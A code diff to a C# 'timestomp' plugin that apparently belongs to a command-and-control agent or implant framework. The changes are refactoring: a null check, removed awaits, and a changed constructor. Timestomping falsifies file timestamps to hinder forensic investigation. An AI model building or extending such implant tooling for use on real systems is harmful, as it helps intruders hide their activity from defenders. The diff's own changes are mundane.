@@ -9,22 +9,22 @@ namespace Agent
     {
         public string Name => "timestomp";
         private IMessageManager messageManager { get; set; }
-        private ITokenManager tokenManager { get; set; }
 
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
+        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
         {
             this.messageManager = messageManager;
-            this.tokenManager = tokenManager;
         }
         public async Task Execute(ServerJob job)
         {
             string response = String.Empty;
             TimeStompArgs args = JsonSerializer.Deserialize<TimeStompArgs>(job.task.parameters);
-            
+            if(args is null){
+                return;
+            }
             
             if(!args.Validate(out response))
             {
-                await messageManager.Write(response, job.task.id, true, "error");
+                messageManager.Write(response, job.task.id, true, "error");
             }
 
             //StringBuilder sb = new StringBuilder();
@@ -51,7 +51,7 @@ namespace Agent
                 //sb.AppendFormat("Could not timestomp {0}: {1}", args.destination, e.ToString()).AppendLine();
             }
 
-            await messageManager.Write(response, job.task.id, true);
+            messageManager.Write(response, job.task.id, true);
         }
     }
 }
